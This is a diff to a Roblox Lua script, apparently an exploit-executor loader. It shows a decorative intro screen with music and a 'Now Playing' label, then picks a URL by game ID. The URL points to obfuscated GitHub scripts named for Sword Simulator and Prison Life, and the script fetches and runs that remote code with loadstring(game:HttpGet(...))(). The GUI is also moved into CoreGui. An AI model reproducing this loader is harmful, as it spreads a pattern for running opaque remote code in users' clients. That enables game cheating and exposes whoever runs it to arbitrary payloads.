@@ -3,9 +3,10 @@ local CallITFUCKINGDOPEINTROLMAO = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local Background = Instance.new("Frame")
 local TextLabel = Instance.new("TextLabel")
+local TextLabel_2 = Instance.new("TextLabel")
 
 CallITFUCKINGDOPEINTROLMAO.Name = "CallITFUCKINGDOPEINTROLMAO"
-CallITFUCKINGDOPEINTROLMAO.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+CallITFUCKINGDOPEINTROLMAO.Parent = game.CoreGui
 CallITFUCKINGDOPEINTROLMAO.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 Frame.Parent = CallITFUCKINGDOPEINTROLMAO
 Frame.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
@@ -31,25 +32,47 @@ TextLabel.TextScaled = true
 TextLabel.TextSize = 14.000
 TextLabel.TextWrapped = true
 
--- Scripts:
-
-local function EISQTWF_fake_script() -- Frame.LocalScript
+local id = {"160442087","345655898"} -- Animalcrosing Able Sisters 160442087 SpookySkeleton 345655898
+local playid = id[math.random(1,2)]
+TextLabel_2.Parent = Frame
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Position = UDim2.new(0, 0, 0.628457367, 0)
+TextLabel_2.Size = UDim2.new(0, 803, 0, 94)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "Now Playing:"
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 14.000
+TextLabel_2.TextWrapped = true
+TextLabel_2.Visible = false
+local link = ""
+if playid == "345655898" then TextLabel_2.Text = "Now Playing: Able Sisters Theme - Animal Crossing New Leaf"
+elseif playid == "160442087" then TextLabel_2.Text = "Now Playing: SPOOKY SCARY SKELETONS" end
+if game.PlaceId == 1142908823 then
+	link = 'https://raw.githubusercontent.com/Lennardsid/ww/master/OBFUSCATED_7de78f8_SwordSimulator.lua'
+elseif game.PlaceId == 155615604 then
+link = 'https://raw.githubusercontent.com/Lennardsid/ww/master/OBFUSCATED_06b0ff3_EclipsePrisonLife.lua'
+end
+local function EISQTWF_fake_script()
 	local script = Instance.new('LocalScript', Frame)
 
-	local sound = Instance.new("Sound", Frame)
-	sound.SoundId = "rbxassetid://345655898"
-	sound.Volume = 2
+	local sound = Instance.new("Sound", game.Workspace)
+	
+	sound.SoundId = "rbxassetid://"..playid
+	sound.Volume = 0.5
 	sound:Play()
 	local tab = script.Parent
 	local TweenService = game:GetService("TweenService")
 	local tweenInfo1 = TweenInfo.new(2.5,Enum.EasingStyle.Sine,Enum.EasingDirection.Out)
 	local tween1 = TweenService:Create(tab, tweenInfo1, {Size=UDim2.new(0, 803, 0, 14)})
-	local tween15 = TweenService:Create(tab, tweenInfo1, {Size=UDim2.new(0, 803, 0, 155)})
+	local tween15 = TweenService:Create(tab, tweenInfo1, {Size=UDim2.new(0, 804, 0, 264)})
 	local tweenInfo2 = TweenInfo.new(5,Enum.EasingStyle.Sine,Enum.EasingDirection.Out)
-	local tween2 = TweenService:Create(tab, tweenInfo1, {Size=UDim2.new(0, 0, 0, 155)})
+	local tween2 = TweenService:Create(tab, tweenInfo1, {Size=UDim2.new(0, 0, 0, 264)})
 	tween1:Play()
 	wait(2)
 	tween15:Play()
+	TextLabel_2.Visible = true
 	wait(2.5)
 	local background = script.Parent.Background
 	script.Parent.Background.BackgroundTransparency = script.Parent.Background.BackgroundTransparency + 0.1
@@ -74,8 +97,9 @@ local function EISQTWF_fake_script() -- Frame.LocalScript
 	wait(1)
 	tween2:Play()
 	wait(1.1)
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/Lennardsid/ww/master/OBFUSCATED_7de78f8_SwordSimulator.lua',true))()
-	wait(15)
+	print(game.PlaceId)
+	loadstring(game:HttpGet(link,true))()
+	wait(4)
 	script.Parent.Parent:Destroy()
 end
 coroutine.wrap(EISQTWF_fake_script)()
